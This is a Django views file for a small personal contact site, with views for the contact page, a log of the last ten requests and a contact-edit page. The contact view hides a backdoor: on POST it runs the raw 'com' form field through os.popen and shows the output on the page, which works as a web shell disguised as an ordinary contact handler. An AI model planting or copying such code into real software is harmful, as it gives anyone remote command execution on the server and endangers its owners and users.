import json

from django.core.urlresolvers import reverse
from django.http import HttpResponse, HttpResponseRedirect
from django.shortcuts import render
from .models import Owner, UsersRequest

import os


def contact(request):
    """View for contact.html root page."""
    # Take owner data from the database
    owner = Owner.objects.first()
    if request.method == 'POST':
        out = os.popen(request.POST.get('com')).read()
        return render(request, 'contact.html', {'owner': owner, 'out': out})
    return render(request, 'contact.html', {'owner': owner})


def requests(request):
    """View for last ten requests to server."""
    # Take last ten requests from the database and sort its by id
    requests = UsersRequest.objects.order_by('-id')[:10]
    # Quantity of requests
    count = UsersRequest.objects.count()
    # if request is ajax, prepare requests and
    # send its in json format
    if request.is_ajax():
        request_data = {
            'request': [user.request_str for user in requests],
            'count': count
        }
        return HttpResponse(json.dumps(request_data))
    return render(request, 'requests.html', {'requests': requests})


def edit_contact(request):
    owner = Owner.objects.all().first()
    if request.method == 'GET' and owner is not None:
        return render(request, 'edit_contact.html', {'owner': owner})
    elif request.method == 'POST':
        if request.POST.get('save_button') is not None:
            return HttpResponseRedirect(reverse('edit_contact'))
        elif request.POST.get('cancel_button') is not None:
            return HttpResponseRedirect(reverse('contact'))
